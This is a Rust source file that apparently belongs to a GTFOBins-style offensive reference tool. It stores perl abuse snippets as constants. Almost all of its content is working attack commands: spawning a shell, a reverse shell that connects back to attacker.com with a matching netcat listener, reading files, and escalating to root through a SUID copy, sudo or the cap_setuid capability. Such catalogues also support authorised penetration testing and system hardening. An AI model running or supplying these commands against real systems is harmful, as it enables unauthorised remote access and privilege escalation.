pub static BIN_NAME: &'static str = "perl";
pub static SH_CODE: &'static str = r#"
    
    perl -e 'exec "/bin/sh";'
"#;
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;
    $i="$ENV{RHOST}";
    $p=$ENV{RPORT};
    socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
    if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
    open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    perl -ne print $LFILE
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which perl) .

    ./perl -e 'exec "/bin/sh";'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo perl -e 'exec "/bin/sh";'
"#;
pub static CB_CODE: &'static str = r#"
    
    cp $(which perl) .
    sudo setcap cap_setuid+ep perl

    ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static CB: Code<'static> = Code {
    title: "CB_CODE",
    code: CB_CODE,
    tag: Tag::CB,
};
